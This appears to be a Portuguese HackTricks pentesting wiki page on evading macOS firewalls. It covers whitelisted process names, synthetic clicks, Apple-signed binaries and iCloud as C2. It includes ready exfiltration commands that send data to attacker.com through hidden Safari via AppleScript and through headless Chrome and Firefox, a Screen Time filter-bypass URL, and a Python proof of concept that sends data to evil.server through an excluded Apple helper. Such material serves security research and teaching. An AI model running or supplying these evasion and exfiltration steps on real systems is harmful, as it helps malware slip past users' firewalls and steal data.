# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Técnicas encontradas

As seguintes técnicas foram encontradas funcionando em alguns aplicativos de firewall do macOS.

### Abusando nomes de lista branca

- Por exemplo, chamando o malware com nomes de processos bem conhecidos do macOS como **`launchd`**

### Clique Sintético

- Se o firewall pedir permissão ao usuário, faça o malware **clicar em permitir**

### **Use binários assinados pela Apple**

- Como **`curl`**, mas também outros como **`whois`**

### Domínios bem conhecidos da Apple

O firewall pode estar permitindo conexões a domínios bem conhecidos da Apple, como **`apple.com`** ou **`icloud.com`**. E o iCloud pode ser usado como um C2.

### Bypass Genérico

Algumas ideias para tentar contornar firewalls

### Verifique o tráfego permitido

Saber o tráfego permitido ajudará você a identificar domínios potencialmente na lista branca ou quais aplicativos têm permissão para acessá-los.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusando do DNS

As resoluções de DNS são feitas através do aplicativo assinado **`mdnsreponder`**, que provavelmente será permitido contatar servidores DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Através de aplicativos de navegador

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Injeções de processos

Se você puder **injetar código em um processo** que tenha permissão para se conectar a qualquer servidor, poderá contornar as proteções do firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilidades recentes de bypass de firewall do macOS (2023-2025)

### Bypass do filtro de conteúdo da web (Tempo de Tela) – **CVE-2024-44206**
Em julho de 2024, a Apple corrigiu um bug crítico no Safari/WebKit que quebrou o “filtro de conteúdo da web” em todo o sistema usado pelos controles parentais do Tempo de Tela. 
Uma URI especialmente elaborada (por exemplo, com “://” codificado em URL duplo) não é reconhecida pela ACL do Tempo de Tela, mas é aceita pelo WebKit, portanto, a solicitação é enviada sem filtragem. Qualquer processo que possa abrir uma URL (incluindo código sandboxed ou não assinado) pode, portanto, acessar domínios que estão explicitamente bloqueados pelo usuário ou por um perfil MDM.

Teste prático (sistema não corrigido):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug de ordenação de regras do Packet Filter (PF) no início do macOS 14 “Sonoma”
Durante o ciclo beta do macOS 14, a Apple introduziu uma regressão no wrapper de espaço do usuário em torno do **`pfctl`**. 
Regras que foram adicionadas com a palavra-chave `quick` (usada por muitos kill-switches de VPN) foram ignoradas silenciosamente, causando vazamentos de tráfego mesmo quando uma GUI de VPN/firewall relatava *bloqueado*. O bug foi confirmado por vários fornecedores de VPN e corrigido na RC 2 (build 23A344).

Verificação rápida de vazamento:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusando de serviços auxiliares assinados pela Apple (legado – pré-macOS 11.2)
Antes do macOS 11.2, a **`ContentFilterExclusionList`** permitia que ~50 binários da Apple, como **`nsurlsessiond`** e a App Store, contornassem todos os firewalls de filtro de soquete implementados com o framework Network Extension (LuLu, Little Snitch, etc.).
Malware poderia simplesmente criar um processo excluído—ou injetar código nele—e tunnelizar seu próprio tráfego sobre o soquete já permitido. A Apple removeu completamente a lista de exclusão no macOS 11.2, mas a técnica ainda é relevante em sistemas que não podem ser atualizados.

Exemplo de prova de conceito (pré-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Dicas de ferramentas para macOS moderno

1. Inspecione as regras PF atuais que os firewalls GUI geram:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumere os binários que já possuem a concessão *outgoing-network* (útil para piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registre programaticamente seu próprio filtro de conteúdo de Extensão de Rede em Objective-C/Swift.
Um PoC minimal sem root que encaminha pacotes para um socket local está disponível no código-fonte do **LuLu** de Patrick Wardle.

## Referências

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
